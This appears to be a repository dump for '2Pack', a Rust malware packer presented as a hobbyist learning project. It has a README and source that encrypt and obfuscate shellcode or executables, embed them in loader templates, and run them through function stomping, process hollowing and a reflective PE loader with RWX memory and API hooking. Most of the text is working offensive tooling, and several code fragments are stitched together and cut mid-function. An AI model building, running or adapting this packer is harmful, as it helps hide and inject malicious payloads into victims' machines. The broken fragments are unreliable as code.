## 📖 Overview

2Pack is a simple packing tool designed for malware hobbyists. It supports both PE files (EXE/DLL) and raw shellcode. The tool employs multiple layers of protection including AES encryption, XOR obfuscation, and compression before embedding payloads in the .rsrc sections of template loaders.


---

>⚠️*Please note that all templates were written with no evasion techniques in mind, This project was created solely for educational purposes to learn more about windows internals. The techniques implemented are very outdated and mainstream, there is 0 chance of making it past any self-respecting AV/EDR :(*
>
>I will continue updating the templates as I progress in my maldev journery <3

---

## ⚙️Usage:

- Specify the input file using `--input` or `-i`
- Specify the file format using `--format` or `-f`
- Specify the mode, either local or remote, using `--mode` or `-m` 
- Specify the targeted process for injetction in remote mode using `--process` or `-p`
- Specify the template file using `-t` or `--template`
  
#### Example:
```
> cargo run --bin tpack -- --input shellcode.bin --format shellcode --mode remote --template stomper --process Calc.exe
```

## 🚀Templates:  


##### ⚡️ *Stomper* :  `--template stomper`
Remote Function stomping via memory patching. The template Allocates RWX memory in target process, injects payload, and overwrites NtQuerySystemTime entry with jumps to injected shellcode. 


##### 👻 *Hollower* : `--template hollower`
Remote Process Hollowing where the template creates a suspended process pointing to legitimate code, then hollows out the thread's context to redirect execution to injected shellcode.  


##### 🛠 *Reflective-Loader* :  `--template reflective-loader`
A custom PE loader that manually parses and maps portable executable files (EXE-DLL) directly into memory without using the Windows loader or touching the disk.  



💡 Templates parameters


|          | Stomper | Hollower | Reflective-Loader |
|----------|----------|----------|----------|
| Local    |   ✅       |   ❌       |   ✅       |
| Remote    |   ✅       |    ✅      |    ❌      |
| Shellcode   |    ✅      |  ✅        |  ❌        |
| Exe   |     ❌     |    ❌      |✅          |

use anyhow::{Result, Context, bail};
use std::path::PathBuf;
use std::fs;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;

use crate::utils::{green, blue, red, yellow};
use crate::pe_parser::PEFile;




pub fn build_packed_exe(
	// args 
	encrypted_data: &[u8],
	args: Option<&str>,
	template_pe_path: &PathBuf,
	key: &[u8;32],
	iv: &[u8;12],

	) -> Result<String> {

	println!("{} Building packed executable ...", green("[*]"));

	let mut file_bytes = fs::read(template_pe_path)
		.context("Failed to read template executable!")?;
	
	let original_size = file_bytes.len();
	println!("{} Template loaded: {} bytes", blue("[+]"), original_size);

	let pe = PEFile::from_bytes(&file_bytes)
		.context("Failed to parse the template executable!")?;

	let rsrc_section = pe.sections.iter()
		.find(|s| s.Name.starts_with(b".rsrc"))
		.context(".rsrc section wasn't found!!")?;

	let	section_name   = String::from_utf8_lossy(&rsrc_section.Name);
	let rsrc_offset    = rsrc_section.PointerToRawData as usize;
	let rsrc_size      = rsrc_section.SizeOfRawData as usize; 

	println!("{} Found .rsrc section:", blue("[+]"));
    println!("    Raw offset: 0x{:X}", rsrc_offset);
    println!("    Raw size: {} bytes", rsrc_size);


    let mut payload: Vec<u8> = Vec::new();
    // Structure: [DATA][4-bytes][encrypted shellcode][ARGS][encrypted arguments][KEY_][32 bytes key][IV_][12 bytes iv][END_]
    
    payload.extend(b"DATA");
    payload.extend(&(encrypted_data.len() as u32).to_le_bytes());
    payload.extend(encrypted_data);

    let args_str = args
        .map(|s| s.to_string())  // Convert Option<&str> to Option<String>
        .unwrap_or_else(|| "C:\\Windows\\System32\\calc.exe".to_string()); // Use calc.exe as the default if value is set to None

    payload.extend(b"ARGS");
	payload.extend(&(args_str.len() as u32).to_le_bytes());
	payload.extend(args_str.as_bytes());
    
    payload.extend(b"KEY_");
    payload.extend(key);
    payload.extend(b"IV__");
    payload.extend(iv);
    payload.extend(b"END_");

	let payload_size = payload.len();

    let resource_header_size = 64;
    let data_area_start = rsrc_offset + resource_header_size;
    let data_area_size = rsrc_size - resource_header_size;

    
    if payload_size > data_area_size {
        bail!("Payload too large! Need {} bytes, .rsrc data area has {} bytes", 
              payload_size, data_area_size);
    }


    let write_offset = data_area_start;
    let write_end    = write_offset + payload_size;
    println!("{} Writing payload ({} bytes)", blue("[+]"), payload_size);


    if write_end > file_bytes.len() {
        bail!("Write would exceed file bounds");
	}

    file_bytes[write_offset..write_end].copy_from_slice(&payload);
    

    let packed_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("packed");
    fs::create_dir_all(&packed_dir)
        .context("Failed to create output directory")?;

    // Generate a random name
    let rand_name: String = thread_rng()
        .sample_iter(Alphanumeric)
        .take(10)
        .map(char::from)
        .collect();

    let output_path = packed_dir.join(format!("{}.exe", rand_name));

    // Write the packed file to disk
    fs::write(&output_path, &file_bytes)
        .context("Failed to write packed executable")?;

    println!("{} Packed executable created: {}", green("[*]"), green(output_path.display()));


    Ok(output_path.to_string_lossy().into_owned())


}

use anyhow::{anyhow, bail, Context, Result};
use rand::{RngCore, rngs::OsRng as RandOsRng};
use aes_gcm::{Aes256Gcm, Nonce, KeyInit, aead::{Aead, AeadCore, OsRng}};




pub struct PackerEncryptor {
	key: [u8; 32],
	iv: [u8; 12],
}


impl PackerEncryptor {

	pub fn new() -> Self {

		// Key and IV generation
		let mut key = [0u8; 32];
		let mut iv = [0u8; 12];

		RandOsRng.fill_bytes(&mut key);
		RandOsRng.fill_bytes(&mut iv);

		Self {key, iv}
	}


	pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>> {
		let compressed = self.compress(data)?;

		// Create a Cipher & Nonce 
		let cipher = Aes256Gcm::new_from_slice(&self.key)
				.map_err(|e| {println!("[!] Error : {:?}", e); anyhow::anyhow!("[!] Failed to create Cipher!!")})?;

		let nonce = Nonce::from_slice(&self.iv);
		let ciphertext = cipher.encrypt(nonce, &compressed[..])
				.map_err(|e| {println!("[!] Error : {:?}", e); anyhow::anyhow!("[!] Encryption failed!!")})?;


		Ok(ciphertext)
	}

	// XOR obfuscation

	pub fn obfuscate(&self, data: &[u8]) -> Result<Vec<u8>>{

		let mut obfuscated = Vec::with_capacity(data.len());
		let xor_key: u8 = 0xAA;

		for &byte in data {
			obfuscated.push(&byte ^ xor_key)
		};

		Ok(obfuscated)
	}


	pub fn compress(&self, data: &[u8]) -> Result<Vec<u8>> {

		use flate2::write::ZlibEncoder;
		use flate2::Compression;
		use std::io::Write;

		let obfuscated = self.obfuscate(data)?;
		let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
		encoder.write_all(&obfuscated)?;
		Ok(encoder.finish()?)

	}

	// Helper functions in main
	pub fn get_key(&self) -> [u8; 32] {self.key}
	pub fn get_iv(&self) -> [u8; 12] {self.iv}



}

use anyhow::{bail, Result, Context};
use std::mem;
use std::path::Path;
use std::fs;
use winapi::um::winnt::*;




pub struct ImportInfo {
    pub dll_name: String,
    pub functions: Vec<ImportFunction>,
    pub first_thunk: u32,
    pub original_first_thunk: u32,
}


pub struct ImportFunction {
    pub name: Option<String>, 
    pub ordinal: Option<u16>, 
    pub rva: u32, 
}



pub struct PEFile {

    pub raw_data: Vec<u8>,
    pub dos_header: IMAGE_DOS_HEADER,
    pub is_64bit: bool,
    pub entry_point: u64,
    pub image_base: u64,
    pub section_alignment: u32,
    pub file_alignment: u32,  
    pub size_of_image: u32,
    pub sections: Vec<IMAGE_SECTION_HEADER>,
    pub raw_section_data: Vec<Vec<u8>>,
    // both header types for flexibility
    pub nt_headers_32: Option<IMAGE_NT_HEADERS32>,
    pub nt_headers_64: Option<IMAGE_NT_HEADERS64>,
    
    // data directories for easy access
    pub data_directories: [IMAGE_DATA_DIRECTORY; 16],

    pub imports: Vec<ImportInfo>,

}







/// Main parsing logic 

impl PEFile {

    pub fn from_file <P: AsRef<Path>> (file_path: P) ->  Result<Self> {


        let f_path = file_path.as_ref();
        let raw_data = fs::read(f_path)
            .with_context(|| format!("\n[!] Failed to open the file {:?}", f_path))?;

        Self::from_bytes(&raw_data)

    }
    
    pub fn from_bytes(data: &[u8]) -> Result<Self> {

        let dos_header = unsafe { *(data.as_ptr() as *const IMAGE_DOS_HEADER) };
        if dos_header.e_magic != 0x5A4D {
            bail!("Invalid DOS signature: 0x{:04X}", dos_header.e_magic);
        }

        let nt_offset = dos_header.e_lfanew as usize;
        let signature = unsafe { *(data.as_ptr().add(nt_offset) as *const u32) };
        if signature != 0x00004550 {
            bail!("Invalid PE signature: 0x{:08X}", signature);
        }

        let file_header_offset = nt_offset + 4;
        let file_header =
            unsafe { &*(data.as_ptr().add(file_header_offset) as *const IMAGE_FILE_HEADER) };

        let optional_header_offset = file_header_offset + mem::size_of::<IMAGE_FILE_HEADER>();
        let magic = unsafe { *(data.as_ptr().add(optional_header_offset) as *const u16) };


        let (is_64bit, entry_point, image_base, size_of_image, section_alignment, file_alignment, data_directories, nt_headers_32, nt_headers_64) =
            match magic {
                0x10b => { // PE32
                    let nt_headers = unsafe { &*(data.as_ptr().add(nt_offset) as *const IMAGE_NT_HEADERS32) };
                    (
                        false,
                        nt_headers.OptionalHeader.AddressOfEntryPoint as u64,
                        nt_headers.OptionalHeader.ImageBase as u64,
                        nt_headers.OptionalHeader.SizeOfImage,
                        nt_headers.OptionalHeader.SectionAlignment,
                        nt_headers.OptionalHeader.FileAlignment,
                        nt_headers.OptionalHeader.DataDirectory,
                        Some(*nt_headers),
                        None,
                    )
                }
                0x20b => { // PE32+
                    let nt_headers = unsafe { &*(data.as_ptr().add(nt_offset) as *const IMAGE_NT_HEADERS64) };
                    (
                        true,
                        nt_headers.OptionalHeader.AddressOfEntryPoint as u64,
                        nt_headers.OptionalHeader.ImageBase,
                        nt_headers.OptionalHeader.SizeOfImage,
                        nt_headers.OptionalHeader.SectionAlignment,
                        nt_headers.OptionalHeader.FileAlignment,
                        nt_headers.OptionalHeader.DataDirectory,
                        None,
                        Some(*nt_headers),
                    )
                }
                _ => bail!("Unknown optional header magic: 0x{:04X}", magic),
            };

        // Parse sections
        let sections_offset = optional_header_offset + file_header.SizeOfOptionalHeader as usize;
        let num_sections = file_header.NumberOfSections as usize;
        let mut sections = Vec::with_capacity(num_sections);
        let section_ptr = unsafe { data.as_ptr().add(sections_offset) as *const IMAGE_SECTION_HEADER };

        for i in 0..num_sections {
            sections.push(unsafe { *section_ptr.add(i) });
        }

        // Extract raw section data
        let raw_section_data: Vec<Vec<u8>> = sections
            .iter()
            .filter_map(|section| {
                let start = section.PointerToRawData as usize;
                let size = section.SizeOfRawData as usize;
                if size == 0 || start + size > data.len() {
                    None
                } else {
                    Some(data[start..start + size].to_vec())
                }
            })
            .collect();

        // Imports
        let import_dir = if !is_64bit {
            &nt_headers_32.as_ref().unwrap().OptionalHeader.DataDirectory[1]
        } else {
            &nt_headers_64.as_ref().unwrap().OptionalHeader.DataDirectory[1]
        };

        let imports = Self::get_imports(data, &sections, import_dir.VirtualAddress, is_64bit)?;

        Ok(Self {
            raw_data: data.to_vec(),
            dos_header,
            is_64bit,
            entry_point,
            image_base,
            section_alignment,
            file_alignment,
            size_of_image,
            sections,
            raw_section_data,
            nt_headers_32,
            nt_headers_64,
            data_directories: nt_headers_32
                .as_ref()
                .map(|h| h.OptionalHeader.DataDirectory)
                .unwrap_or(nt_headers_64.as_ref().unwrap().OptionalHeader.DataDirectory),
            imports,
        })
    }




    //////////////////////////////////////////////////////////////
    /////////////////////// Helpers functions /////////////////////
    ///////////////////////////////////////////////////////////////


    // Helper to get the virtual size of a section
    pub fn section_virtual_size(section: &IMAGE_SECTION_HEADER) -> u32 {
        unsafe { *section.Misc.VirtualSize() }
    }


    pub fn original_first_thunk_fn(import_desc: &IMAGE_IMPORT_DESCRIPTOR) -> u32 {
        unsafe { *import_desc.u.OriginalFirstThunk() }
    }


    // Converts an RVA to a file offset using the sections table
    pub fn rva_to_file_offset(rva: u32, sections: &[IMAGE_SECTION_HEADER]) -> Result<usize> {
        for section in sections {
            let start = section.VirtualAddress;
            let size = Self::section_virtual_size(section);
            let end = start + size;
            if rva >= start && rva < end {
                let offset_in_section = rva - start;
                return Ok((section.PointerToRawData + offset_in_section) as usize);
            }
        }
        bail!("RVA 0x{:08X} not found in any section", rva)
    }

    /// Read a null terminated string from a byte slice at a given file offset
    pub fn read_c_string(data: &[u8], offset: usize) -> String {
        let mut end = offset;
        while end < data.len() && data[end] != 0 {
            end += 1;
        }
        String::from_utf8_lossy(&data[offset..end]).to_string()
    }


    pub fn get_imports(data: &[u8], sections: &[IMAGE_SECTION_HEADER], import_rva: u32, is_64bit: bool) -> Result<Vec<ImportInfo>> {
        
        let mut imports = Vec::new();
        if import_rva == 0 {
            return Ok(imports);
        }

        let import_offset = Self::rva_to_file_offset(import_rva, sections)?;

        let mut current_offset = import_offset;
        loop {
            if current_offset + mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>() > data.len() {
                break;
            }

            let descriptor = unsafe {
                &*(data.as_ptr().add(current_offset) as *const IMAGE_IMPORT_DESCRIPTOR)
            };

            if descriptor.Name == 0 && descriptor.FirstThunk == 0 {
                break;
            }

            // Read DLL name
            let dll_name = Self::rva_to_file_offset(descriptor.Name, sections)
                .ok()
                .map(|off| Self::read_c_string(data, off))
                .unwrap_or_default();

            // Read functions
            let lookup_rva = if Self::original_first_thunk_fn(descriptor) != 0 {
                Self::original_first_thunk_fn(descriptor)
            } else {
                descriptor.FirstThunk
            };

            let lookup_offset = Self::rva_to_file_offset(lookup_rva, sections).unwrap_or(0);
            let mut functions = Vec::new();
            let entry_size = if is_64bit { 8 } else { 4 };
            let mut func_offset = lookup_offset;
            let entry_size = if is_64bit { 8 } else { 4 };

            let mut index = 0;

            loop {
                if func_offset + entry_size > data.len() { break; }

                let entry = if is_64bit {
                    unsafe { *(data.as_ptr().add(func_offset) as *const u64) }
                } else {
                    unsafe { *(data.as_ptr().add(func_offset) as *const u32) as u64 }
                };

                if entry == 0 { break; }

                let func_rva = descriptor.FirstThunk + (index * entry_size) as u32; // **RVA of this thunk**

                if entry & (if is_64bit { 0x8000000000000000 } else { 0x80000000 }) != 0 {
                    // Ordinal import
                    let ordinal = (entry & 0xFFFF) as u16;
                    functions.push(ImportFunction {
                        name: None,
                        ordinal: Some(ordinal),
                        rva: func_rva,
                    });
                } else {
                    // Named import
                    let name_rva = (entry & 0xFFFFFFFF) as u32;

                    // Find the section containing the name
                    let mut func_name = String::new();
                    let mut hint = 0u16;

                    for section in sections {
                        let size = unsafe { *section.Misc.VirtualSize() };
                        if name_rva >= section.VirtualAddress && name_rva < section.VirtualAddress + size {
                            let name_offset = section.PointerToRawData + (name_rva - section.VirtualAddress);
                            if (name_offset as usize) + 2 < data.len() {
                                // Read hint (first 2 bytes)
                                hint = unsafe { *(data.as_ptr().add(name_offset as usize) as *const u16) };
                                // Read null-terminated function name string
                                func_name = Self::read_c_string(data, name_offset as usize + 2);
                            }
                            break;
                        }
                    }

                    functions.push(ImportFunction {
                        name: Some(func_name),
                        ordinal: None,
                        rva: func_rva,
                    });
                }

                index += 1;
                func_offset += entry_size;
            }


            imports.push(ImportInfo {
                dll_name,
                functions,
                first_thunk: descriptor.FirstThunk,
                original_first_thunk: Self::original_first_thunk_fn(descriptor),
            });

            current_offset += mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
        }

        Ok(imports)
    }





}

unsafe fn load_pe(pe: PEFile) -> Result<()> {

    let base = unsafe {
        VirtualAlloc(
            pe.image_base as _,
            pe.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
            )
    };

    if base.is_null() {
        bail!("[?] VirtualAlloc failed to allocate memory in the current process!");
    }

    println!("[+] Memory allocated successfully!");

    let image_base = base as *mut u8;


    let size_of_headers = pe.nt_headers_64.unwrap().OptionalHeader.SizeOfHeaders as usize;
    let raw_headers     = pe.raw_data[..size_of_headers].to_vec();
    
    unsafe {
        ptr::copy_nonoverlapping(raw_headers.as_ptr(), image_base, raw_headers.len())
    };

    println!("[+] Raw Headers copied into the allocated memory space");


    // Copying sections data

    for (sec, raw) in pe.sections.iter().zip(pe.raw_section_data.iter()) {

        let dest = unsafe {
            image_base.add(sec.VirtualAddress as usize)
        };

        unsafe {
            ptr::copy_nonoverlapping(raw.as_ptr(), dest, raw.len())
        };


        let virtual_size = unsafe {*sec.Misc.VirtualSize() as usize};
        if virtual_size > raw.len() {
            unsafe {
                ptr::write_bytes(
                    dest.add(raw.len()),
                    0,
                    virtual_size - raw.len()
                    )
            };
        }

        let name = std::str::from_utf8(&sec.Name)
            .unwrap_or("????")
            .trim_end_matches("\0");

        println!("[+] Mapped section {:<8} -> {:p}", name,dest);
    }



    // Apply relocations if needed

    let delta = image_base as isize - pe.image_base as isize;
    if delta == 0 { 
        println!("[*] Image loaded at preferred base, no relocations needed")
    } else {
        bail!("[?] Image was not loaded at its preferred base, allocation needed :(")
    };


    // Resolve the IAT

    for import in pe.imports {
        let dll_name_cstr = CString::new(import.dll_name.clone()).context("DLL name ha null byte?")?;
        
        let h_module = unsafe {
            LoadLibraryA(dll_name_cstr.as_ptr())
        };

        if h_module.is_null(){
            bail!("[!] Failed to load DLL: {}", import.dll_name)
        }

        println!("     - {} Loaded successfully",import.dll_name );


        ///// Looping over function names 

        for func in &import.functions {
            let func_addr = if let Some(ref name) = func.name {
                // Named import
                let name_cstr = std::ffi::CString::new(name.clone()).context("Failed to convert the Srting function name into a CString")?;
                unsafe { winapi::um::libloaderapi::GetProcAddress(h_module, name_cstr.as_ptr()) }
            } else if let Some(ord) = func.ordinal {

                let ordinal = (ord & 0xFFFF) as u16;

                unsafe {winapi::um::libloaderapi::GetProcAddress(h_module, ordinal as usize as *const i8,)
                }
            } else {
                            continue; // Should not happen
            };


            if func_addr.is_null() {
                bail!("[!] Failed to resolve the function in {}: {:?}", import.dll_name, func.name);
            }

            // Calculate the actual address in memory (image_base + RVA)

            let iat_addr = unsafe { image_base.add(func.rva as usize) as *mut usize };

            unsafe { *iat_addr = func_addr as usize };

            println!(
                "       + Resolved {:?}    ->    {:p} at RVA 0x{:X}",
                func.name.as_deref().unwrap_or("Unknown"),
                func_addr,
                func.rva
            );
        }

    }

   ///////////////////////// SECTIONS PROTECTIONS

    for section in pe.sections {
        let size = unsafe { *section.Misc.VirtualSize() };
        let section_base = unsafe { image_base.add(section.VirtualAddress as usize) };
        let section_size = std::cmp::max(size as usize, section.SizeOfRawData as usize);

        // Determine protection based on section characteristics
        let protect = if section.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            if section.Characteristics & IMAGE_SCN_MEM_WRITE != 0 {
                PAGE_EXECUTE_READWRITE
            } else if section.Characteristics & IMAGE_SCN_MEM_READ != 0 {
                PAGE_EXECUTE_READ
            } else {
                PAGE_EXECUTE
            }
        } else {
            // Non-executable sections
            if section.Characteristics & IMAGE_SCN_MEM_WRITE != 0 {
                PAGE_READWRITE
            } else if section.Characteristics & IMAGE_SCN_MEM_READ != 0 {
                PAGE_READONLY
            } else {
                PAGE_NOACCESS
            }
        };

        let mut old_protect = 0;
        
        unsafe {
            if VirtualProtect(
                section_base as *mut _,
                section_size,
                protect,
                &mut old_protect
            ) == 0 {
                let error = GetLastError();
                eprintln!("[!] Failed to set protection for section {}: Error {}", 
                    std::str::from_utf8(&section.Name).unwrap_or("????").trim_end_matches('\0'),
                    error);
            }
        };

        println!("[+] Set protection 0x{:X} for section {:<8} at {:p}", 
            protect,
            std::str::from_utf8(&section.Name).unwrap_or("????").trim_end_matches('\0'),
            section_base);
    }

    ////// Execution


    let entry_point = unsafe {

        image_base.add(pe.entry_point as usize)
    };

    println!("[*] Entry point at {:p}", entry_point);   


    let dll_main: extern "system" fn (
        *mut core::ffi::c_void,
        u32,
        *mut core::ffi::c_void
        ) -> i32 = unsafe {std::mem::transmute(entry_point)};



    let result = unsafe {
    dll_main(
        image_base as *mut core::ffi::c_void,
        DLL_PROCESS_ATTACH,
        std::ptr::null_mut(),
        )
    };

    println!("[+] DllMain returned {}", result);



    Ok(())
}




fn main() -> Result<()> {

    println!("[*] Extracting the embedded payload ...");
    let (dll_bytes, _) = Xtract()?;

    let pe = PEFile::from_bytes(&dll_bytes)?;

    println!("[*] Loading the PE file into memory ...");
    unsafe {load_pe(pe)}?;

    Ok(())

    // ─────────────────────────────────────────────────────────────
    let pe_sig = *(base.add(e_lfanew) as *const u32);

        bail!("Invalid PE signature");
    }

    let magic = *(optional_header as *const u16);

    // ─────────────────────────────────────────────────────────────
    // 3. Export Directory RVA
    // ─────────────────────────────────────────────────────────────
    let export_rva = match magic {
        0x20B => { // PE32+
            *(optional_header.add(0x70) as *const u32)
        }
        0x10B => { // PE32
            *(optional_header.add(0x60) as *const u32)
        }
        _ => bail!("Unknown OptionalHeader magic"),
    };

    if export_rva == 0 {
        bail!("No export directory");
    }

    println!("    Export Directory RVA: 0x{:08X}", export_rva);

    let export_dir = base.add(export_rva as usize);

    // ─────────────────────────────────────────────────────────────
    // 4. IMAGE_EXPORT_DIRECTORY fields
    // ─────────────────────────────────────────────────────────────
    let number_of_names        = *(export_dir.add(0x18) as *const u32);
    let address_of_functions  = *(export_dir.add(0x1C) as *const u32);
    let address_of_names      = *(export_dir.add(0x20) as *const u32);
    let address_of_ordinals   = *(export_dir.add(0x24) as *const u32);

    println!("    Number of named exports: {}", number_of_names);

    let names      = base.add(address_of_names as usize) as *const u32;
    let ordinals   = base.add(address_of_ordinals as usize) as *const u16;
    let functions  = base.add(address_of_functions as usize) as *const u32;

    // 5. Walking the exports
    // ─────────────────────────────────────────────────────────────
    let target = "NtQuerySystemTime"; // Our target function

    for i in 0..number_of_names {

fn stomp(dll_base: usize, func_addr: usize, shellcode: &[u8]) -> Result<()> {
    
    unsafe {
        println!("[+] Hooking function NtQuerySystemTime at 0x{:X}...", func_addr);
        
        let allocated_addr = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if allocated_addr.is_null() {
            bail!("[?] Failed to allocate memory for shellcode");
        }
        
        println!("[+] Allocated memory at: 0x{:X}", allocated_addr as usize);
        
        
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), allocated_addr as *mut u8, shellcode.len());

        println!("[+] Wrote {} shellcode bytes to 0x{:X}", shellcode.len(), allocated_addr as usize);
        

        
        // Change protection to write
        let mut old_protection = 0;
        VirtualProtect(
            func_addr as *mut _,
            14, // jmp instruction size
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        );
        
        // Create hook: jmp to our shellcode
        let mut hook_bytes = Vec::new();
        hook_bytes.extend_from_slice(&[0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]); // jmp [rip]
        
        let allocated_addr_usize = allocated_addr as usize;
        hook_bytes.extend_from_slice(&allocated_addr_usize.to_le_bytes()); // Our shellcode address

        std::ptr::copy_nonoverlapping(
            hook_bytes.as_ptr(),
            func_addr as *mut u8,
            hook_bytes.len(),
        );

        //Restore original protection

        VirtualProtect(
            func_addr as *mut _,
            14,
            old_protection,
            &mut old_protection,
        );
        
    

        println!("[+] HOOK INSTALLED SUCCESSFULLY at :   0x{:X}", allocated_addr as usize);
        println!("[+] Triggering hook");
    
        type NtQuerySystemTime = extern "system" fn() -> u64;
        let func: NtQuerySystemTime = std::mem::transmute(func_addr);
        
        func();

        Ok(())
    }

fn decrypt (data: &[u8], key: &[u8; 32], iv: &[u8; 12]) -> Result<Vec<u8>> {

	let cipher = Aes256Gcm::new_from_slice(key)
			.map_err(|e| {println!("[!] Error: {:?}", e);anyhow::anyhow!("[!] Failed to created cipher!")})?;
	let nonce  = GenericArray::from_slice(iv);

	let compressed = cipher.decrypt(nonce, data)
			.map_err(|e| {println!("[!] Error: {:?}", e);anyhow::anyhow!("[!] Failed to decrypt data!")})?;


	let mut decoder = ZlibDecoder::new(&compressed[..]);
	let mut decomp  = Vec::new();

	decoder.read_to_end(&mut decomp)?;
	let mut deobf = Vec::with_capacity(decomp.len());

	let xor_key: u8 = 0xAA;

	for byte in decomp {
			deobf.push(byte ^ xor_key)
		};

	Ok(deobf)

}





fn get_unicode_string(process_handle: HANDLE, s: &UNICODE_STRING) -> Result<String> {
    unsafe {
        if s.Buffer.is_null() || s.Length == 0 {
             return Ok(String::new());
        }

        // Allocate buffer for UTF-16 string
        let buffer_size = s.Length as usize;
        let mut buffer = vec![0u16; (buffer_size / 2) as usize + 1];
        let mut bytes_read = 0;

        // Read from REMOTE process memory
        let res = ReadProcessMemory(
            process_handle,
            s.Buffer as *const c_void,
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut bytes_read,
        );

        if res == 0 || bytes_read != buffer_size {
            bail!(format!("[Failed to read string: {} bytes]", bytes_read));
        }

        // Convert UTF-16 to String (remove null terminator if present)
        let len = buffer_size / 2;
        Ok(String::from_utf16_lossy(&buffer[..len]))
    }

const TEMPLATES_PATH: &str = concat!(env!("CARGO_MANIFEST_DIR"), "\\templates\\");

#[derive(Debug, Deserialize)]
pub struct TemplateInfo {
    pub name: Option<String>,
    pub target_process: Option<bool>,
    pub remote: Option<bool>,
    pub local: Option<bool>,
    pub description: Option<String>,
    pub shellcode: Option<bool>,

pub fn verify_args(args: &Args) -> Result<PathBuf>{
	
	// Verifying infos

	
	// Loading templates parameters from templates/templates.info
	let templates_info = PathBuf::from(format!("{}templates.info", TEMPLATES_PATH));
	let templates: Vec<TemplateInfo> = load_templates_info(&templates_info).expect("Failed to load templates.info");
	
	let template_name = args.template.to_string().to_lowercase();

	// locate the choosen templates inside the templates.info 

	let info = templates
		.into_iter()
		.find(|t| t.name.as_ref()
		.map(|n| n.to_lowercase() == template_name)
		.unwrap_or(false));


	let info = match info {
	    Some(t) => t,
	    None => {
	        bail!("{} Template '{}' not found in templates.info!", red("[?]"),red(&args.template.to_string()));
	    
	    }
	};


	// Validating mode arguments

	match args.target_mode {
	    TargetMode::Local => {
	        if args.target_process.is_some() {
	            bail!(
	                "\n{} You cannot specify a target process in local mode!",
	                red("[?]")
	            );
	          
	        }
	    }

	    TargetMode::Remote => {
	        // For remote mode, ensure template requires a target process
	        if info.target_process.unwrap_or(false) && args.target_process.is_none() {
	            bail!(
	                "\n{} Template '{}' requires a target process for remote mode!",
	                red("[?]"),
	                red(&args.template.to_string())
	            );
	          
	        }
	    }
	}



	match args.target_mode {
		TargetMode::Local => {
			if !info.local.unwrap_or(false) {
				bail!(
                	"\n{} Template {} does not support local mode!",
                	red("[?]"),
               	 	red(&args.template.to_string()));

			}


		}

		TargetMode::Remote => {
			if !info.remote.unwrap_or(false){
				bail!(
                	"\n{} Template {} does not support remote mode!",
                	red("[?]"),
               	 	red(&args.template.to_string()));

	
			}
		}
	}


	// Validating format arguments!
	// Some templates aren't available for both shellcode and PE files :(

	match args.format{
		Format::EXE | Format::DLL => {
			if !info.pe.unwrap_or(false) {
				bail!(
                	"\n{} Template {} does not support Portable Executable files!",
                	red("[?]"),
               	 	red(&args.template.to_string()));	
			}
		}

		Format::SHELLCODE => {
			if !info.shellcode.unwrap_or(false) {
				bail!(
                	"\n{} Template {} does not support Shellcode!",
                	red("[?]"),
               	 	red(&args.template.to_string()));	
			}
		}
	}
	


	// Building template path
	let mut template_file = PathBuf::from(TEMPLATES_PATH);
	template_file.push("compiled");
	


	template_file.push(
		format!("{}_{}_{}.2pk",
			&args.target_mode.to_string(),
			match &args.format {
				Format::DLL => "dll",
				Format::EXE => "exe",
				Format::SHELLCODE => "shellcode"
			}, 
			&args.template.to_string()
			)
		);


	println!("{} Using Template file --> {}", yellow("[*]"), yellow(template_file.display()));

	
	Ok(template_file)
}


// Loading the templtaes parameters from templates.info 

pub fn load_templates_info(path: &PathBuf) -> Result<Vec<TemplateInfo>> {
    
    let content = fs::read_to_string(path)
        .with_context(|| format!("Failed to read template file '{}'", path.display()))?;
    
    let templates: Vec<TemplateInfo> = serde_json::from_str(&content)
        .with_context(|| format!("Failed to parse JSON from '{}'", path.display()))?;
    Ok(templates)
}

//// ----- Shellcode 

pub fn prep_shellcode(bin_path: &PathBuf) -> Result<Vec<u8>> {

	let shellcode = fs::read(bin_path)
		.with_context(|| format!("Failed to read the shellcode file: {}", red(bin_path.display())))?;

	if shellcode.is_empty() {
		bail!("Shellcode file is empty: {}", red(bin_path.display()));
	}
	println!("{} Read {} bytes of shellcode", blue("[+]"), shellcode.len());

	let shellcode_bytes = convert_ascii_hex_string_to_binary(&shellcode)?;

	Ok(shellcode_bytes)
}


// .bin shellcode files need to be convereted into binary bytes 

fn convert_ascii_hex_string_to_binary(ascii_bytes: &[u8]) -> Result<Vec<u8>> {

    let text = String::from_utf8_lossy(ascii_bytes);
    let mut bytes = Vec::new();
    let mut hex = String::with_capacity(2);
    
    for ch in text.chars() {
        if ch.is_ascii_hexdigit() {
            hex.push(ch);
            if hex.len() == 2 {
                if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                    bytes.push(byte);
                }
                hex.clear();
            }
        } else if !hex.is_empty() {
            hex.clear();
        }
    }
    
    Ok(bytes)
}


//// ----- PE files  

pub fn prep_pe(pe_path: &PathBuf) -> Result<Vec<u8>> {

    let pe_bytes = fs::read(pe_path)
        .with_context(|| format!("Failed to read the PE file: {}", pe_path.display()))?;
    

    
    let pe =  PEFile::from_bytes(&pe_bytes)?;

   	println!("\n   Architecture         : {}", if pe.is_64bit {"64-bit"} else {"32-bit"});
    println!("   Size of Image        : {}", pe.size_of_image);
    println!("   Number of Sections   : {}", pe.sections.len());
    println!("   Sections             : ");
    
	for sec in &pe.sections {
	    println!("    + {}", String::from_utf8_lossy(&sec.Name).trim_end_matches('\0'));
	}
	
	println!("   Data directories     : {}\n", pe.data_directories.len());

    Ok(pe_bytes)
}
